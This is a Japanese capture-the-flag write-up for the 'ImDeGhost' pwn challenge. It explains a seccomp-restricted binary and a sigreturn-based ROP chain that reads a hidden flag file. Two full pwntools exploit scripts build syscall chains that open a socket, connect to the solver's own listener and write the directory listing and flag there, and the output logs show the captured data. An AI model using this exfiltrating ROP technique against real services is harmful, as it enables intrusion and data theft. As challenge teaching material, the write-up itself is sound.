## ImDeGhost

> Points: ?
>
> Solves: 4

### Description:
Are you afraid of ghosts? Warning: The flag is not the usual "flag.txt" file. Instead, it is in a file with a name format of a length 16 binary string of 0's and 1's in the current directory. An example of this format is "0101010110101010". Connect with "nc 143.198.127.103 42007".

Author: Rythm

### Attachments:
```
imdeghost.zip
```

## Analysis:

オーサーに確認したところ想定解ではありませんでしたが、想定解より簡単な方法で解くことができました。

ROPによるシェルコード問題ですが、seccompでmmap, mprotect, execve,remap_file_pages, execveat, pkey_mprotect のシステムコールは禁止されていました。 

```
$ seccomp-tools dump ./imdeghost 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x06 0x00 0x00000009  if (A == mmap) goto 0012
 0006: 0x15 0x05 0x00 0x0000000a  if (A == mprotect) goto 0012
 0007: 0x15 0x04 0x00 0x0000003b  if (A == execve) goto 0012
 0008: 0x15 0x03 0x00 0x000000d8  if (A == remap_file_pages) goto 0012
 0009: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0012
 0010: 0x15 0x01 0x00 0x00000149  if (A == pkey_mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```
コードの実行領域は`0x133700000000`で、スタック領域は`0x6900000000`です。
入力できるのはスタック領域のみのため、ROPのみでシェルコードを作成する必要があります。

PIEのアドレスを取得できないのでROPガジェットで利用できるのは0x133700000000の
下記命令に限られました。このため`pop rdi; ret`などのレジスタにpopするROPガジェットを使用できませんでした。

```
=> 0x133700000000:	mov    r15,rdi
   0x133700000003:	xor    rax,rax
   0x133700000006:	xor    rbx,rbx
   0x133700000009:	xor    rcx,rcx
   0x13370000000c:	xor    rdx,rdx
   0x13370000000f:	xor    rdi,rdi
   0x133700000012:	xor    rsi,rsi
   0x133700000015:	xor    rbp,rbp
   0x133700000018:	xor    r8,r8
   0x13370000001b:	xor    r9,r9
   0x13370000001e:	xor    r10,r10
   0x133700000021:	xor    r11,r11
   0x133700000024:	xor    r12,r12
   0x133700000027:	xor    r13,r13
   0x13370000002a:	xor    r14,r14
   0x13370000002d:	movabs rsp,0x6900000000
   0x133700000037:	mov    r14,0x3
   0x13370000003e:	dec    r14
   0x133700000041:	mov    rdi,r14
   0x133700000044:	mov    rax,0x3
   0x13370000004b:	syscall 　　　　　　　　<=主に使用したROPガジェット
   0x13370000004d:	test   r14,r14
   0x133700000050:	jne    0x13370000003e
   0x133700000052:	mov    rax,r15
   0x133700000055:	ret    
```

また、上記のコードの最後で標準入力と標準出力と標準エラー出力をCloseしているため、
フラグを標準出力に出力することはできません。
またフラグのファイル名は`0101010110101010`のようなファイル名になっているため
何らかの方法でファイル名を取得する必要がありました。

## Solution:

下記のROPガジェットを使用してsyscallするために、r15レジスタに任意の値を設定する
必要がありますが、最初の入力サイズの256の剰余がr15に入ります。
```
   0x13370000004b:	syscall
   0x13370000004d:	test   r14,r14
   0x133700000050:	jne    0x13370000003e
   0x133700000052:	mov    rax,r15
   0x133700000055:	ret
```

各レジスタに設定する方法として、私は`sys_rt_sigreturn(15)`を利用しました。
`sys_rt_sigreturn(15)`を利用することで全てのレジスタを設定することができます。

`sys_rt_sigreturn(15)`を利用しながら、下記の順番でシステムコールを呼び出すことで、ファイル名をローカル環境に出力させることができました。

- sys_open("./", 0, 0x200000)
- sys_getdents(0, mem+0xb00, 0x300)
- sys_socket(2, 1, 6)
- sys_connect(1, mem+0xe80, 0x10)
- sys_write(1, mem+0xb00, 0x300)

ファイル名は、`0101111001001101`でした。

同様に下記の順番でシステムコールを呼び出すことで、フラグをローカル環境に出力させることができました。

- sys_open("./", 0, 0x200000)
- sys_read(0, mem+0xb00, 0x300)
- sys_socket(2, 1, 6)
- sys_connect(1, mem+0xe80, 0x10)
- sys_write(1, mem+0xb00, 0x300)

なお想定解は、`sys_getdents(78)`を用いないで、`/proc/self/mem`をオープンして`0x133700000000`の領域を`sys_pwrite64(18)`を用いて直接実行コードを書き込む方法でした。
https://github.com/pbjar/Challenges/blob/main/Pwn/imdeghost/imdeghost.py

Rythmさん、面白い問題と早いサポートありがとうございました。

## Exploit code:
ファイル名を取得するためのpythonコード（サーバから取得する場合には、NATなどを別途設定する必要があります。）
```python
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './imdeghost'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42007
  s = remote(HOST, PORT)
  ip_addr = 0xbe409f76  
else:
  s = process(BINARY)
  libc = elf.libc
  ip_addr = 0x0100007f  # 127.0.0.1 

s.recvuntil("for you will not be seeing it again.\n")

mem         = 0x6900000000
syscall_ret = 0x13370000004b # syscall; test r14,r14; jne 0x13370000003e; mov rax,r15; ret

def Sigreturn(rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip, r8, r9, r10, r11, r12, r13, r14, r15):
  buf  = p64(0)*5
  buf += p64(r8) + p64(r9) + p64(r10) + p64(r11) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
  buf += p64(rdi) + p64(rsi) + p64(rbp) + p64(rbx) + p64(rdx) + p64(rax) + p64(rcx) + p64(rsp) + p64(rip)
  buf += p64(0) + p64(0x33) + b"AAAAAAAA"*4 + p64(0)
  return buf

mem = 0x6900000000

buf  = p64(syscall_ret)
# sys_open("./", 0, 0x200000)
buf += Sigreturn(2, 0, 0, 0x200000, 0, mem + 0xe00, mem + 0x170, mem + 0xf0, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_getdents(0, mem+0xb00, 0x300)
buf += Sigreturn(78, 0, 0, 0x300, mem + 0xb00, 0, mem + 0x170, mem + 0xf0*2, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_socket(2, 1, 6)
buf += Sigreturn(0x29, 0, 0, 6, 1, 2, mem + 0x170, mem + 0xf0*3, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_connect(1, mem+0xe80, 0x10)
buf += Sigreturn(0x2a, 0, 0, 0x10, mem + 0xe80, 1, mem + 0x170, mem + 0xf0*4, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_write(1, mem+0xb00, 0x300)
buf += Sigreturn(1, 0, 0, 0x300, mem + 0xb00, 1, mem + 0x170, mem + 0xf0*5, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

buf += b"A"*(0xe00-len(buf))
buf += b"./\x00"
buf += b"A"*(0xe80-len(buf))
buf += p32(0x55550002) + p32(ip_addr)
buf += b"A"*(0xf00+15-len(buf))
#pause()
s.send(buf)

s.interactive()
```

flagファイルを取得するためのpythonコード（サーバから取得する場合には、NATなどを別途設定する必要があります。）
```python
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './imdeghost'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42007
  s = remote(HOST, PORT)
  ip_addr = 0xbe409f76  
else:
  s = process(BINARY)
  libc = elf.libc
  ip_addr = 0x0100007f  # 127.0.0.1 

s.recvuntil("for you will not be seeing it again.\n")

mem         = 0x6900000000
syscall_ret = 0x13370000004b # syscall; test r14,r14; jne 0x13370000003e; mov rax,r15; ret

def Sigreturn(rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip, r8, r9, r10, r11, r12, r13, r14, r15):
  buf  = p64(0)*5
  buf += p64(r8) + p64(r9) + p64(r10) + p64(r11) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
  buf += p64(rdi) + p64(rsi) + p64(rbp) + p64(rbx) + p64(rdx) + p64(rax) + p64(rcx) + p64(rsp) + p64(rip)
  buf += p64(0) + p64(0x33) + b"AAAAAAAA"*4 + p64(0)
  return buf

buf  = p64(syscall_ret)
# sys_open("./0101111001001101\", 0, 0)
buf += Sigreturn(2, 0, 0, 0, 0, mem + 0xe00, mem + 0x170, mem + 0xf0, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_read(0, mem+0xb00, 0x300)
buf += Sigreturn(0, 0, 0, 0x300, mem + 0xb00, 0, mem + 0x170, mem + 0xf0*2, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_socket(2, 1, 6)
buf += Sigreturn(0x29, 0, 0, 6, 1, 2, mem + 0x170, mem + 0xf0*3, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_connect(1, mem+0xe80, 0x10)
buf += Sigreturn(0x2a, 0, 0, 0x10, mem + 0xe80, 1, mem + 0x170, mem + 0xf0*4, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_write(1, mem + 0xb00, 0x300)
buf += Sigreturn(1, 0, 0, 0x300, mem + 0xb00, 1, mem + 0x170, mem + 0xf0*5, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

buf += b"A"*(0xe00-len(buf))
buf += b"./0101111001001101\x00"
buf += b"A"*(0xe80-len(buf))
buf += p32(0x55550002) + p32(ip_addr)
buf += b"A"*(0xf00+15-len(buf))
#pause()
s.send(buf)

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost$ python3 solve_filename.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost/imdeghost'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42007: Done
[*] Switching to interactive mode
Boo.

mito@ubuntu:~/Desktop$ nc -lp 21845
...
dockerenvAN(0101111001001101AAAAAA...
```

```bash
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost$ python3 solve_flag.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost/imdeghost'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42007: Done
[*] Switching to interactive mode
Boo.

mito@ubuntu:~/Desktop$ nc -lp 21845
flag{aAaaaaAaaAAaAAAAaAAaAAAAaaAaaaaA}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

## Reference:

http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

https://inaz2.hatenablog.com/entry/2014/07/30/021123